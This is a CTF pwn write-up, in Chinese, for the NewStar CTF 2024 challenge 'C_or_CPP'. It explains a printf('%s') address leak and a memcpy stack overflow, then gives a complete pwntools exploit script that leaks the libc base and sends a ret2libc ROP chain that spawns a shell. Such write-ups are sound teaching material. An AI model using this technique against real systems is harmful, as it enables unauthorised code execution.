# C_or_CPP

> 分类：Pwn

## 题目描述
一个用 C 和 C++ 实现相同操作对比的程序。程序存在两个漏洞：
- 功能 2 中先 `read(0, buf, 0x50)` 再 `printf("%s", buf)`，可用于泄露地址；
- 功能 5 中先 `cin` 输入字符串再 `memcpy(dest, v2, 0x100)`，`dest` 在栈上，存在栈溢出。

## 考察知识点
- 栈溢出（Stack Overflow）
- 地址泄露（`printf("%s")` 读到 `\x00` 为止）
- ret2libc / ROP（g++ 编译，gadget 少，用 libc 的 gadget）
- C++ `std::string` 与 C 字符串混用的边界问题

## 解法
拖入 IDA 分析。第一个漏洞：`read(0, buf, 0x50)` 之后用 `printf("%s")` 输出，由于没有 `\x00` 截断，会一直泄露栈上后续地址，从而拿到 libc 基址。

第二个漏洞：`cin` 读入字符串后 `memcpy(dest, v2, 0x100)` 造成栈溢出，构造 ROP 链。由于是 g++ 编译，程序内 gadget 很少，所以用 libc 的 gadget。

EXP：

```python
#!/usr/bin/env python3
from pwn import *

context(log_level='debug', arch='amd64', os='linux')
context.terminal = ["tmux", "splitw", "-h"]
uu64 = lambda x: u64(x.ljust(8, b'\x00'))
s = lambda x: p.send(x)
sa = lambda x, y: p.sendafter(x, y)
sl = lambda x: p.sendline(x)
sla = lambda x, y: p.sendlineafter(x, y)
r = lambda x: p.recv(x)
ru = lambda x: p.recvuntil(x)

k = 0
if k:
    addr = '127.0.0.1:9999'
    host = addr.split(':')
    p = remote(host[0], host[1])
else:
    p = process('./C_or_CPP')
elf = ELF('./C_or_CPP')
libc = ELF('./libc.so.6')

def debug():
    gdb.attach(p, 'b *0x402F8F\nb *0x402A22\nc\n')

# debug()
sla(b'Please choose an option:', b'2')
sla(b'C++ String input:', b'inkey')
sa(b'C String input:', b'a' * 0x50)
ru(b'a' * 0x50)
libc_base = uu64(r(6)) - 0x4B1040
# libc_base = uu64(r(6)) - 0x4BB040
print(f"libc_base --> 0x{libc_base :x}")

rdi = libc_base + 0x000000000002A3E5  #: pop rdi; ret;
rsi = libc_base + 0x000000000016333A  #: pop rsi; ret;
rdx_rbx = libc_base + 0x00000000000904A9  #: pop rdx; pop rbx; ret;
bin_sh = libc_base + 0x001D8678
system = libc_base + libc.sym.system
# pause()

sla(b'Please choose an option:', b'5')
payload = b'a' * 0x48 + flat([rdi, bin_sh, rsi, 0, rdx_rbx, 0, 0, system])
sla(b'Try to say something:', payload)

p.interactive()
```

## 参考答案
（未给出）

## 来源
- 作者：NewStar CTF 2024 官方 WriteUp | https://newstar.wiki/wp/2024/week5/pwn/c_or_cpp.html
